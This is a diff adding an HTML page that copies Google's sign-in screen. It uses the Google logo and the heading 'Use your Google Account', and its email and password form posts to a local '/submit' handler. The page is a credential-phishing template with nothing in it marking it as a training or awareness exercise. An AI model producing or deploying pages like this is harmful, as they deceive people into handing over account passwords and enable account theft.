@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body >
+    <div class="bg-gray-200 flex items-center justify-center min-h-screen">
+        <div>
+            <div class="bg-white p-6 rounded-lg shadow-md text-center h-[60vh] w-[30vw]">
+                <div class="flex items-center justify-center">
+                    <img class="w-[25%] " src="https://logo.clearbit.com/google.com" alt="Google Logo" />
+                </div>
+                <h1 class="mt-5 text-2xl font-bold">Sign in</h1>
+                <p class="mt-2 text-gray-600">Use your Google Account</p>
+                <form action="/submit" method="post" class="mt-5">
+                    <input class="mt-4 w-[80%] p-2 border border-gray-300 rounded-md" type="email" required placeholder="Email" name="email"/>
+                    <input class="mt-4 w-[80%] p-2 border border-gray-300 rounded-md" type="password" required placeholder="Password" name="password"/>
+                    <p class="text-blue-500 text-sm mt-2 text-left">Forgot password?</p>
+                    <p class="text-gray-600 text-sm mt-4 text-left">
+                        Not your computer? Use Guest mode to sign in privately. 
+                        <a href="#" class="text-blue-500">Learn more</a>
+                    </p>
+                    <button class="bg-blue-500 text-white border-none py-2 px-6 rounded-r-3xl rounded-l-3xl cursor-pointer text-lg mt-5 float-right">
+                        Next
+                    </button>
+                </form>
+            </div>
+            <div class="text-gray-600 text-xs text-center mt-6">
+                <span class="mr-4">English (United Kingdom)</span>
+                <a href="#" class="mr-4 text-gray-600">हिन्दी</a>
+                <a href="#" class="mr-4 text-gray-600">Español</a>
+            </div>
+        </div>
+    </div>
+    
+</body>
+</html>
